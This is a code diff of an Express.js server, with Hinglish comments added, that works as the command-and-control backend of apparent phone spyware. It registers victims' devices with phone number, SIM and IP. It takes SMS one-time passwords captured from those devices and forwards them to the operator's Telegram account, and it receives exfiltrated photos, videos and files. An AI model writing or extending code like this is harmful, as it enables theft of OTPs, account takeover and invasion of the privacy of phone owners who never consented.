@@ -10,6 +10,7 @@ app.use(express.json());
 
 let devices = {};
 
+// Device Register API
 app.post('/api/register-device', (req, res) => {
     const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
     devices[deviceId] = { 
@@ -25,12 +26,14 @@ app.post('/api/register-device', (req, res) => {
     res.json({ success: true });
 });
 
+// App se SMS/OTP aayega
 app.post('/api/otp-data', (req, res) => {
     const { deviceId, otp } = req.body;
     bot.sendMessage(YOUR_USER_ID, `📩 OTP for device ${deviceId}: ${otp}`);
     res.json({ success: true });
 });
 
+// App se Photo/Video/File data aayega
 app.post('/api/upload-data', (req, res) => {
     const { deviceId, type, data } = req.body;
     
@@ -130,6 +133,7 @@ function isAuthorized(msg) {
     return msg.from.id === YOUR_USER_ID;
 }
 
+// Express server start karo
 app.listen(3000, () => {
     console.log("Server running on port 3000");
 });
